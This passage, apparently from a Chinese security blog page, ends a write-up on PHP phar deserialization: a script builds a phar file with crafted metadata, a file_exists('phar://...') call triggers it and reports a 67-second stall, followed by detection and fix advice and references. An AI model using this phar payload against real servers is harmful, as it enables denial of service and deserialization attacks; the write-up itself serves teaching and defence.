class="built_in">stdClass</span>;</span><br><span class="line"><span class="variable">$new_obj</span>-&gt;hacker = <span class="variable">$array</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> Phar(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/phar.phar&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;hacker.php&#x27;</span>] = <span class="string">&#x27;&lt;?php ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>-&gt;setMetadata(<span class="variable">$new_obj</span>);</span><br><span class="line"><span class="variable">$p</span>-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>index.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$startTime</span> = microtime(<span class="literal">true</span>);</span><br><span class="line">file_exists(<span class="string">&quot;phar://phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$endTime</span> = microtime(<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Time comsumption: &#x27;</span>.(<span class="variable">$endTime</span> - <span class="variable">$startTime</span>). <span class="string">&#x27; s&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问：<a target="_blank" rel="noopener" href="http://127.0.0.1/index.php">http://127.0.0.1/index.php</a> 耗时67秒</p>
+<p><img src="https://i.loli.net/2019/09/22/ylbmEeDsXfNSWta.jpg" alt="ddos.jpg"></p>
+<h2 id="漏洞的检测与修复"><a href="#漏洞的检测与修复" class="headerlink" title="漏洞的检测与修复"></a>漏洞的检测与修复</h2><p>检测：</p>
+<ol>
+<li>使用RIPS自动化检测</li>
+</ol>
+<p>RIPS对敏感字符串分析使我们能够精确评估文件路径是完全还是由攻击者控制，以及是否可以phar://注入。</p>
+<p>修复：</p>
+<ol>
+<li>在文件系统函数的参数可控时，对参数进行严格的过滤。</li>
+<li>严格检查上传文件的内容，而不是只检查文件头。</li>
+<li>在条件允许的情况下禁用可执行系统命令、代码的危险函数。</li>
+</ol>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/182231.html">https://www.freebuf.com/articles/web/182231.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2715">https://xz.aliyun.com/t/2715</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2613">https://xz.aliyun.com/t/2613</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.zsxsoft.com/post/38">https://blog.zsxsoft.com/post/38</a></li>
+<li><a target="_blank" rel="noopener" href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf">https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf</a></li>
+</ul>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 Threezh1
+        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label> -->
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
